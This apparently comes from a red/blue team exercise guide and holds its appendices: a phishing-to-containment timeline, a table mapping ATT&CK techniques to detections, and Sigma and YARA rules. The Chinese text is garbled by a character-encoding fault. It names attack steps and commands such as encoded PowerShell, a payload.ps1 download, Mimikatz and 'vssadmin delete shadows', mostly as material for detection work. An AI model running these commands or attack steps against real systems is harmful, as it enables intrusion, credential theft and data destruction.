<h2 id="é™„å½•fæ ·ä¾‹æ”»å‡»-æ£€æµ‹æ—¶é—´çº¿æ•°æ®é›†"><a class="header" href="#é™„å½•fæ ·ä¾‹æ”»å‡»-æ£€æµ‹æ—¶é—´çº¿æ•°æ®é›†">é™„å½•Fï¼šæ ·ä¾‹æ”»å‡»-æ£€æµ‹æ—¶é—´çº¿æ•°æ®é›†</a></h2>
<div class="table-wrapper"><table><thead><tr><th>åºå·</th><th>æ—¶é—´ (UTC+8)</th><th>æ—¥å¿—æ¥æº</th><th>äº‹ä»¶æè¿°</th><th>æ”»å‡»é˜¶æ®µ</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>001</td><td>2024-05-07 10:12:05</td><td>Gophish</td><td>é‚®ä»¶ <code>HR-ç¦åˆ©è°ƒæ•´</code> å‘é€ç»™ alice@corp.com</td><td>Recon/Delivery</td><td>é‚®ä»¶ID GH-0001</td></tr>
<tr><td>002</td><td>2024-05-07 10:12:45</td><td>Gophish</td><td>æ”¶ä»¶äººæ‰“å¼€é‚®ä»¶, User-Agent <code>Outlook/16.0</code></td><td>Delivery</td><td>æ‰“å¼€å»¶è¿Ÿ40ç§’</td></tr>
<tr><td>003</td><td>2024-05-07 10:12:47</td><td>Gophish</td><td>æ”¶ä»¶äººç‚¹å‡»é’“é±¼é“¾æ¥ <code>https://corp-hr.cn/login</code></td><td>Initial Access</td><td></td></tr>
<tr><td>004</td><td>2024-05-07 10:12:49</td><td>Evilginx</td><td>æ•è·ç”¨æˆ·å <code>alice@corp.com</code></td><td>Initial Access</td><td>SessionID EV-2134</td></tr>
<tr><td>005</td><td>2024-05-07 10:12:52</td><td>Evilginx</td><td>æ•è·MFAéªŒè¯ç  <code>439872</code></td><td>Initial Access</td><td></td></tr>
<tr><td>006</td><td>2024-05-07 10:13:07</td><td>VPNæ—¥å¿—</td><td>æ–°VPNè¿æ¥æ¥è‡ª45.77.12.34ï¼Œç”¨æˆ·alice</td><td>Initial Access</td><td>å‡ºå£IPåŒ¹é…æ‹¦æˆªåå•</td></tr>
<tr><td>007</td><td>2024-05-07 10:13:09</td><td>ç™½é˜Ÿè®°å½•</td><td>äº‹ä»¶ç¼–å· RT-2024-001 åˆ›å»º</td><td>Governance</td><td></td></tr>
<tr><td>008</td><td>2024-05-07 10:13:25</td><td>Sysmon (ID1)</td><td>ç›®æ ‡ä¸»æœº <code>HRPC01</code> æ‰§è¡Œ <code>whoami</code></td><td>Execution</td><td>Beaconä¸Šçº¿éªŒè¯</td></tr>
<tr><td>009</td><td>2024-05-07 10:13:32</td><td>Beacon æ—¥å¿—</td><td>C2å›è¿æˆåŠŸï¼Œä¿¡æ ‡é—´éš”60ç§’</td><td>C2</td><td>Profile HTTP-Profile-A</td></tr>
<tr><td>010</td><td>2024-05-07 10:14:18</td><td>Sysmon (ID11)</td><td>PowerShell åŠ è½½ <code>Invoke-Mimikatz</code></td><td>Credential Access</td><td>å‘½ä»¤å“ˆå¸Œ 0x9af3</td></tr>
<tr><td>011</td><td>2024-05-07 10:14:22</td><td>EDRå‘Šè­¦</td><td>ç­–ç•¥ <code>Credential Theft</code> è§¦å‘ï¼ˆé£é™©é«˜ï¼‰</td><td>Detection</td><td>SOCé˜Ÿåˆ—ä¼˜å…ˆçº§P1</td></tr>
<tr><td>012</td><td>2024-05-07 10:14:30</td><td>SIEMäº‹ä»¶</td><td>ç”Ÿæˆå‘Šè­¦ <code>PS_EncodedCommand</code></td><td>Detection</td><td>å‘Šè­¦ID SIEM-4587</td></tr>
<tr><td>013</td><td>2024-05-07 10:14:45</td><td>SOAR</td><td>Playbook <code>PS_EncodedCommand_Response</code> è‡ªåŠ¨æ‰§è¡Œ</td><td>Response</td><td>å·²æ”¶é›†ä¸»æœºä¿¡æ¯</td></tr>
<tr><td>014</td><td>2024-05-07 10:15:03</td><td>SOAR</td><td>è‡ªåŠ¨ä¸‹å‘EDRéš”ç¦»å‘½ä»¤</td><td>Containment</td><td>ç­‰å¾…å®¡æ‰¹</td></tr>
<tr><td>015</td><td>2024-05-07 10:15:25</td><td>Analyst</td><td>åˆ†æå¸ˆç¡®è®¤éš”ç¦»</td><td>Response</td><td>å®¡æ‰¹äºº SOC-Lead</td></tr>
<tr><td>016</td><td>2024-05-07 10:15:41</td><td>EDRçŠ¶æ€</td><td>ä¸»æœº HRPC01 éš”ç¦»æˆåŠŸ</td><td>Response</td><td></td></tr>
<tr><td>017</td><td>2024-05-07 10:16:02</td><td>Beacon æ—¥å¿—</td><td>Beaconæ‰çº¿</td><td>Action on Objectives</td><td>çº¢é˜Ÿè®°å½•æˆåŠŸè§¦å‘æ£€æµ‹</td></tr>
<tr><td>018</td><td>2024-05-07 10:16:15</td><td>è“é˜Ÿå·¥å•</td><td>äº‹ä»¶å• INC-2024-051 åˆ›å»º</td><td>Governance</td><td></td></tr>
<tr><td>019</td><td>2024-05-07 10:17:30</td><td>è“é˜Ÿå·¥å•</td><td>è®°å½•åˆæ­¥å½±å“è¯„ä¼°</td><td>Governance</td><td></td></tr>
<tr><td>020</td><td>2024-05-07 10:17:45</td><td>ç™½é˜Ÿ</td><td>æ›´æ–°è®¡åˆ†è¡¨</td><td>Governance</td><td></td></tr>
<tr><td>021</td><td>2024-05-07 10:18:12</td><td>PowerShellæ—¥å¿—</td><td>ä¸»æœº <code>FINPC02</code> æ‰§è¡Œä¸‹è½½å‘½ä»¤</td><td>Execution</td><td></td></tr>
<tr><td>022</td><td>2024-05-07 10:18:20</td><td>Proxyæ—¥å¿—</td><td>è¯·æ±‚ <code>https://cdn.corp-update.com/payload.ps1</code></td><td>Delivery</td><td>URLè¢«è¿‡æ»¤æ ‡è®°</td></tr>
<tr><td>023</td><td>2024-05-07 10:18:30</td><td>è“é˜Ÿ</td><td>åˆ›å»ºç‹©çŒä»»åŠ¡ <code>HNT-221</code></td><td>Threat Hunting</td><td></td></tr>
<tr><td>024</td><td>2024-05-07 10:18:55</td><td>Beacon æ—¥å¿—</td><td><code>FINPC02</code> ä¿¡æ ‡ä¸Šçº¿</td><td>C2</td><td></td></tr>
<tr><td>025</td><td>2024-05-07 10:19:07</td><td>Sysmon</td><td><code>FINPC02</code> æ‰§è¡Œ <code>net use \FILE01\share</code></td><td>Lateral Movement</td><td></td></tr>
<tr><td>026</td><td>2024-05-07 10:19:12</td><td>Zeek SMB</td><td>è®°å½•æ–°SMBä¼šè¯</td><td>Lateral Movement</td><td></td></tr>
<tr><td>027</td><td>2024-05-07 10:19:34</td><td>Zeek Notice</td><td>è§¦å‘è§„åˆ™ <code>SMB_PTH</code></td><td>Detection</td><td></td></tr>
<tr><td>028</td><td>2024-05-07 10:19:50</td><td>SOAR</td><td>è‡ªåŠ¨ç¦ç”¨è´¦å· <code>alice</code></td><td>Response</td><td></td></tr>
<tr><td>029</td><td>2024-05-07 10:20:05</td><td>è“é˜Ÿ</td><td>é€šçŸ¥ITç¡®è®¤åˆæ³•æ€§</td><td>Governance</td><td></td></tr>
<tr><td>030</td><td>2024-05-07 10:21:20</td><td>çº¢é˜Ÿ</td><td>æŠ¥å‘Šè“é˜Ÿå·²é˜»æ–­</td><td>Governance</td><td></td></tr>
<tr><td>031</td><td>2024-05-07 10:22:00</td><td>æ—¥æŠ¥</td><td>è®°å½•â€œæ£€æµ‹è€—æ—¶ 1åˆ†55ç§’â€</td><td>Metrics</td><td></td></tr>
<tr><td>032</td><td>2024-05-07 10:25:07</td><td>è“é˜Ÿ</td><td>æ”¶é›†å†…å­˜é•œåƒ</td><td>Forensics</td><td></td></tr>
<tr><td>033</td><td>2024-05-07 10:27:45</td><td>è“é˜Ÿ</td><td>ä¸Šä¼ è¯æ®è‡³å–è¯å¹³å°</td><td>Forensics</td><td></td></tr>
<tr><td>034</td><td>2024-05-07 10:32:12</td><td>çº¢é˜Ÿ</td><td>æ¸…ç†æŒä¹…åŒ–ã€è§£é™¤VPN</td><td>Recovery</td><td></td></tr>
<tr><td>035</td><td>2024-05-07 10:45:00</td><td>ç™½é˜Ÿ</td><td>æ›´æ–°é£é™©å°è´¦ L1</td><td>Governance</td><td></td></tr>
<tr><td>036</td><td>2024-05-07 11:30:00</td><td>SOC</td><td>å®Œæˆåˆæ­¥æŠ¥å‘Š</td><td>Governance</td><td></td></tr>
<tr><td>037</td><td>2024-05-07 15:00:00</td><td>ç´«é˜Ÿä¼šè®®</td><td>è®¨è®ºæ£€æµ‹æ¼ç‚¹</td><td>Improvement</td><td></td></tr>
<tr><td>038</td><td>2024-05-07 16:30:00</td><td>è¡ŒåŠ¨é¡¹</td><td>åˆ›å»ºæ”¹è¿›é¡¹ ACT-008</td><td>Improvement</td><td></td></tr>
<tr><td>039</td><td>2024-05-08 09:00:00</td><td>æ”¹è¿›</td><td>å®ŒæˆACT-008</td><td>Improvement</td><td></td></tr>
<tr><td>040</td><td>2024-05-10 09:30:00</td><td>å¤æµ‹</td><td>WMIæ£€æµ‹æˆåŠŸ</td><td>Validation</td><td></td></tr>
<tr><td>041</td><td>2024-05-12 14:00:00</td><td>æŠ¥å‘Š</td><td>æœ€ç»ˆæŠ¥å‘Šè‰ç¨¿å®Œæˆ</td><td>Governance</td><td></td></tr>
<tr><td>042</td><td>2024-05-15 10:00:00</td><td>å¤ç›˜ä¼š</td><td>è¾“å‡º10é¡¹å»ºè®®</td><td>Improvement</td><td></td></tr>
<tr><td>043</td><td>2024-05-20 18:00:00</td><td>è¡ŒåŠ¨é¡¹è·Ÿè¸ª</td><td>å…³é—­ç‡è¾¾90%</td><td>Metrics</td><td></td></tr>
<tr><td>044</td><td>2024-05-30 09:00:00</td><td>å›è®¿</td><td>ä¸ä¸šåŠ¡æ€»ç»“</td><td>Governance</td><td></td></tr>
<tr><td>045</td><td>2024-06-01 12:00:00</td><td>ç™½é˜Ÿ</td><td>å½’æ¡£è¯æ®ã€æ›´æ–°çŸ¥è¯†åº“</td><td>Improvement</td><td></td></tr>
</tbody></table>
</div>
<h2 id="é™„å½•gattck-æŠ€æœ¯ä¸æ£€æµ‹è§„åˆ™æ˜ å°„ç¤ºä¾‹"><a class="header" href="#é™„å½•gattck-æŠ€æœ¯ä¸æ£€æµ‹è§„åˆ™æ˜ å°„ç¤ºä¾‹">é™„å½•Gï¼šATT&amp;CK æŠ€æœ¯ä¸æ£€æµ‹è§„åˆ™æ˜ å°„ç¤ºä¾‹</a></h2>
<div class="table-wrapper"><table><thead><tr><th>æˆ˜æœ¯</th><th>æŠ€æœ¯ç¼–å·</th><th>æŠ€æœ¯åç§°</th><th>çº¢é˜Ÿç¤ºä¾‹</th><th>æ£€æµ‹æ•°æ®æº</th><th>è§„åˆ™/è„šæœ¬</th><th>æ¨èå“åº”</th></tr></thead><tbody>
<tr><td>Initial Access</td><td>T1190</td><td>Exploit Public-Facing Application</td><td>Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</td><td>WebæœåŠ¡å™¨æ—¥å¿—ã€WAFã€Sysmon 1</td><td>WAFè§„åˆ™<code>Struts2-OGNL</code>, Sysmonå‘½ä»¤è¡ŒåŒ¹é…</td><td>ä¸´æ—¶å°ç¦IPã€ä¿®è¡¥æ¼æ´</td></tr>
<tr><td>Initial Access</td><td>T1133</td><td>External Remote Services</td><td>ä½¿ç”¨æ³„éœ²VPNå‡­è¯</td><td>VPNæ—¥å¿—ã€Radiusæ—¥å¿—</td><td>å…³è”ç™»å½•æ¨¡å¼ã€åœ°ç†ä½ç½®æ£€æµ‹</td><td>å†»ç»“è´¦å·ã€å¼ºåˆ¶æ”¹å¯†</td></tr>
<tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>IEX DownloadString</td><td>WinEvent 4104ã€Sysmon6</td><td>Sigma <code>powershell_encoded_command</code></td><td>éš”ç¦»ä¸»æœºã€æŠ“å–å†…å­˜</td></tr>
<tr><td>Execution</td><td>T1053</td><td>Scheduled Task</td><td>æ³¨å†Œè®¡åˆ’ä»»åŠ¡æ‰§è¡Œ payload</td><td>4698ã€Sysmon1</td><td>ç›‘æ§<code>schtasks.exe</code>æ–°å¢ä»»åŠ¡</td><td>åˆ é™¤ä»»åŠ¡ã€è°ƒæŸ¥ä½œè€…</td></tr>
<tr><td>Persistence</td><td>T1547.001</td><td>Registry Run Keys</td><td>æ·»åŠ Runé”®åŠ è½½DLL</td><td>4657ã€Sysmon13</td><td>æ£€æµ‹Run/RunOnce ä¿®æ”¹</td><td>æ¸…ç†æ³¨å†Œè¡¨ã€é‡å¯ä¸»æœº</td></tr>
<tr><td>Persistence</td><td>T1037</td><td>Startup Items</td><td>å°†è„šæœ¬æ”¾å…¥å¯åŠ¨é¡¹</td><td>æ–‡ä»¶å®¡è®¡ã€Sysmon</td><td>ç›‘æ§<code>Startup</code>ç›®å½•æ–‡ä»¶</td><td>åˆ é™¤æ–‡ä»¶ã€æé†’ç”¨æˆ·</td></tr>
<tr><td>Privilege Escalation</td><td>T1068</td><td>Exploitation for Privilege Escalation</td><td>PrintNightmare</td><td>åº”ç”¨æ—¥å¿—ã€Sysmon</td><td>æ£€æµ‹<code>spoolsv</code>å¼‚å¸¸è¡Œä¸º</td><td>ç¦ç”¨æœåŠ¡ã€æ‰“è¡¥ä¸</td></tr>
<tr><td>Privilege Escalation</td><td>T1078</td><td>Valid Accounts</td><td>ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜å¯†ç é‡ç”¨</td><td>4624ã€EDR</td><td>è¯†åˆ«æ¨ªå‘ç™»å½•</td><td>é‡ç½®å¯†ç ã€å¯ç”¨LAPS</td></tr>
<tr><td>Defense Evasion</td><td>T1112</td><td>Modify Registry</td><td>ä¿®æ”¹æ—¥å¿—ç­–ç•¥</td><td>4657ã€Sysmon</td><td>æ£€æµ‹<code>AuditPolicy</code>æ›´æ”¹</td><td>æ¢å¤ç­–ç•¥ã€è°ƒæŸ¥æ¥æº</td></tr>
<tr><td>Defense Evasion</td><td>T1140</td><td>Deobfuscate/Decode Files</td><td><code>certutil -decode</code></td><td>Sysmon 11</td><td>å‚æ•°æ£€æµ‹</td><td>é˜»æ–­åç»­æ‰§è¡Œ</td></tr>
<tr><td>Credential Access</td><td>T1003.001</td><td>LSASS Memory</td><td>Invoke-Mimikatz</td><td>Sysmon 10ã€EDR</td><td>ç›‘æ§<code>lsass</code>å¥æŸ„è®¿é—®</td><td>éš”ç¦»ä¸»æœºã€æ”¶é›†å†…å­˜</td></tr>
<tr><td>Credential Access</td><td>T1555</td><td>Credentials from Password Stores</td><td>å¯¼å‡ºæµè§ˆå™¨å¯†ç </td><td>Sysmon 1ã€æ–‡ä»¶æ—¥å¿—</td><td>æ£€æµ‹<code>Login Data</code>è®¿é—®</td><td>é€šçŸ¥ç”¨æˆ·ã€é‡ç½®å‡­è¯</td></tr>
<tr><td>Discovery</td><td>T1087</td><td>Account Discovery</td><td><code>net user /domain</code></td><td>Sysmon 1ã€PowerShell</td><td>å‘½ä»¤è¡Œå…³é”®å­—</td><td>å®¡æ ¸æ¥æº</td></tr>
<tr><td>Discovery</td><td>T1046</td><td>Network Service Scanning</td><td><code>nmap -p-</code></td><td>Zeekã€Firewall</td><td>ç«¯å£æ‰«ææ£€æµ‹</td><td>å°ç¦æ‰«æIP</td></tr>
<tr><td>Lateral Movement</td><td>T1021.002</td><td>SMB/Windows Admin Shares</td><td>PsExec</td><td>5145ã€Sysmon 3</td><td>æ£€æµ‹<code>psexec</code>è¡Œä¸º</td><td>é˜»æ–­å…±äº«ã€å®¡è®¡è´¦å·</td></tr>
<tr><td>Lateral Movement</td><td>T1080</td><td>Taint Shared Content</td><td>æ›¿æ¢å…±äº«ç›®å½•æ–‡ä»¶</td><td>FIM</td><td>Hashå¯¹æ¯”æŠ¥è­¦</td><td>æ¢å¤æ–‡ä»¶</td></tr>
<tr><td>Command and Control</td><td>T1071.001</td><td>Web Protocols</td><td>Cobalt Strike HTTP</td><td>Proxyã€Zeek</td><td>Beaconæ£€æµ‹</td><td>é˜»æ–­åŸŸå</td></tr>
<tr><td>Command and Control</td><td>T1095</td><td>Non-Application Layer Protocol</td><td>ICMPéš§é“</td><td>Zeek ICMP</td><td>æ•°æ®åŒ…å¤§å°æ£€æµ‹</td><td>é˜»æ–­ICMP</td></tr>
<tr><td>Exfiltration</td><td>T1048</td><td>Exfiltration Over Alternative Protocol</td><td>FTPä¸Šä¼ æ•°æ®</td><td>FTPæ—¥å¿—ã€æµé‡è®°å½•</td><td>ç›‘æ§FTPå¤§æµé‡</td><td>é˜»æ–­ä¼šè¯</td></tr>
<tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>HTTP POSTä¸Šä¼ </td><td>Proxy</td><td>ç›‘æ§POSTæ•°æ®é‡</td><td>å°ç¦è¯·æ±‚</td></tr>
<tr><td>Impact</td><td>T1486</td><td>Data Encrypted for Impact</td><td>å‹’ç´¢åŠ å¯†</td><td>æ–‡ä»¶å®¡è®¡ã€EDR</td><td>ç›‘æ§åŠ å¯†åç¼€</td><td>éš”ç¦»ç»ˆç«¯</td></tr>
<tr><td>Impact</td><td>T1490</td><td>Inhibit System Recovery</td><td>åˆ é™¤å½±å­æ‹·è´</td><td>Sysmon 1</td><td><code>vssadmin delete shadows</code></td><td>ç«‹å³éš”ç¦»</td></tr>
</tbody></table>
</div>
<h2 id="é™„å½•hsigma-ä¸-yara-ç¤ºä¾‹è§„åˆ™"><a class="header" href="#é™„å½•hsigma-ä¸-yara-ç¤ºä¾‹è§„åˆ™">é™„å½•Hï¼šSigma ä¸ YARA ç¤ºä¾‹è§„åˆ™</a></h2>
<pre><code class="language-yaml"># Sigma: Suspicious Base64 PowerShell
title: Suspicious PowerShell Base64 Execution
id: 1f6f56b8-b5a0-4b9a-91c1-ps-encoded
status: experimental
description: Detects PowerShell execution with base64 encoded commands
logsource:
  product: windows
  service: security
  definition: 'EventID 4688'
detection:
  selection:
    NewProcessName|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - '-enc'
      - 'FromBase64String'
  condition: selection
fields:
  - CommandLine
  - ParentProcessName
  - User
falsepositives:
  - Legitimate administrative scripts
level: high
</code></pre>
<pre><code class="language-yaml"># Sigma: SMB Pass-the-Hash Detection
title: Potential Pass-the-Hash Via SMB
id: a21dd550-9a29-4d1c-8d9b-smb-pth
status: experimental
logsource:
  product: windows
  service: security
  definition: 'EventID 4624'
detection:
  selection:
    AuthenticationPackageName: 'NTLM'
    LogonType: 3
  filter_known:
    IpAddress|in:
      - '10.10.10.10'
      - '10.10.10.11'
  timeframe: 10m
  condition: selection and not filter_known
level: high
</code></pre>
<pre><code class="language-yara">rule CobaltStrike_Beacon
{
    meta:
        description = "Detects default cobalt strike beacon config"
        author = "PurpleTeam"
    strings:
        $a = "MZ" ascii at 0
        $b = { 2E 00 30 00 2E 00 30 00 2E 00 30 00 }
        $c = "Cobalt Strike" ascii nocase
    condition:
        $a and $b and $c
}
</code></pre>
<h2 id="é™„å½•iæ•°æ®å­—æ®µæ ‡å‡†åŒ–æ¸…å•"><a class="header" href="#é™„å½•iæ•°æ®å­—æ®µæ ‡å‡†åŒ–æ¸…å•">é™„å½•Iï¼šæ•°æ®å­—æ®µæ ‡å‡†åŒ–æ¸…å•</a></h2>
<div class="table-wrapper"><table><thead><tr><th>æ•°æ®æº</th><th>å­—æ®µ</th><th>æè¿°</th><th>æ•°æ®ç±»å‹</th><th>ç¤ºä¾‹</th></tr></thead><tbody>
<tr><td>WinEvent</td><td>EventID</td><td>äº‹ä»¶ç¼–å·</td><td>integer</td><td>4688</td></tr>
<tr><td>WinEvent</td><td>Computer</td><td>ä¸»æœºå</td><td>string</td><td>HRPC01</td></tr>
<tr><td>WinEvent</td><td>CommandLine</td><td>è¿›ç¨‹å‘½ä»¤</td><td>string</td><td>powershell.exe -enc JAB</td></tr>
<tr><td>VPNæ—¥å¿—</td><td>username</td><td>ç™»å½•ç”¨æˆ·å</td><td>string</td><td>alice</td></tr>
<tr><td>VPNæ—¥å¿—</td><td>public_ip</td><td>ç”¨æˆ·å…¬ç½‘IP</td><td>ip</td><td>45.77.12.34</td></tr>
<tr><td>Proxyæ—¥å¿—</td><td>url</td><td>è®¿é—®URL</td><td>string</td><td>https://cdn.corp-update.com/payload.ps1</td></tr>
<tr><td>Proxyæ—¥å¿—</td><td>bytes_out</td><td>ä¸‹è¡Œå­—èŠ‚</td><td>integer</td><td>10485760</td></tr>
<tr><td>Zeek</td><td>uid</td><td>ä¼šè¯ID</td><td>string</td><td>CH1i4U3dN9h</td></tr>
<tr><td>Zeek</td><td>resp_h</td><td>å“åº”IP</td><td>ip</td><td>10.10.20.15</td></tr>
<tr><td>SOARå·¥å•</td><td>ticket_id</td><td>å·¥å•ç¼–å·</td><td>string</td><td>INC-2024-051</td></tr>
<tr><td>SOARå·¥å•</td><td>sla_due</td><td>SLAæˆªæ­¢</td><td>datetime</td><td>2024-05-07T11:15:00</td></tr>
<tr><td>æŒ‡æ ‡åº“</td><td>metric_name</td><td>æŒ‡æ ‡åç§°</td><td>string</td><td>MTTD</td></tr>
<tr><td>æŒ‡æ ‡åº“</td><td>metric_value</td><td>æŒ‡æ ‡å€¼</td><td>float</td><td>1.92</td></tr>
<tr><td>æŒ‡æ ‡åº“</td><td>target</td><td>ç›®æ ‡å€¼</td><td>float</td><td>2.00</td></tr>
</tbody></table>
</div>
<h2 id="-æ€»ç»“"><a class="header" href="#-æ€»ç»“">ğŸ“ æ€»ç»“</a></h2>
<p>çº¢è“å¯¹æŠ—æ˜¯æå‡ç»„ç»‡å®‰å…¨èƒ½åŠ›çš„æœ‰æ•ˆæ–¹æ³•ã€‚é€šè¿‡æ¨¡æ‹ŸçœŸå®æ”»å‡»ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>å‘ç°é˜²å¾¡ç›²ç‚¹</li>
<li>éªŒè¯å®‰å…¨æ§åˆ¶</li>
<li>æå‡å›¢é˜Ÿèƒ½åŠ›</li>
<li>å®Œå–„å“åº”æµç¨‹</li>
</ul>
<p>æˆåŠŸçš„çº¢è“å¯¹æŠ—éœ€è¦ï¼š</p>
<ol>
<li>æ˜ç¡®çš„ç›®æ ‡å’ŒèŒƒå›´</li>
<li>ä¸“ä¸šçš„çº¢è“å›¢é˜Ÿ</li>
<li>å®Œå–„çš„è§„åˆ™åˆ¶åº¦</li>
<li>æŒç»­çš„æ”¹è¿›ä¼˜åŒ–</li>
</ol>
<p>è®°ä½ï¼šçº¢è“å¯¹æŠ—çš„ç›®çš„æ˜¯å…±åŒè¿›æ­¥ï¼Œè€Œéç®€å•çš„èƒœè´Ÿã€‚</p>
<hr />
<p><strong>æ–‡æ¡£ç‰ˆæœ¬</strong>: v3.0
<strong>æœ€åæ›´æ–°</strong>: 2024å¹´4æœˆ
<strong>ç»´æŠ¤è€…</strong>: Red Team &amp; Blue Team
<strong>åé¦ˆé‚®ç®±</strong>: security@example.com</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../ç¼–ç¨‹/security/æ¸—é€æµ‹è¯•.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../ç¼–ç¨‹/security/ç½‘ç»œæ”»å‡».html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../ç¼–ç¨‹/security/æ¸—é€æµ‹è¯•.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../ç¼–ç¨‹/security/ç½‘ç»œæ”»å‡».html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../theme/segmentit.umd.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../theme/searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->
        <script src="../../theme/pagetoc.js"></script>



    </div>
    </body>
</html>

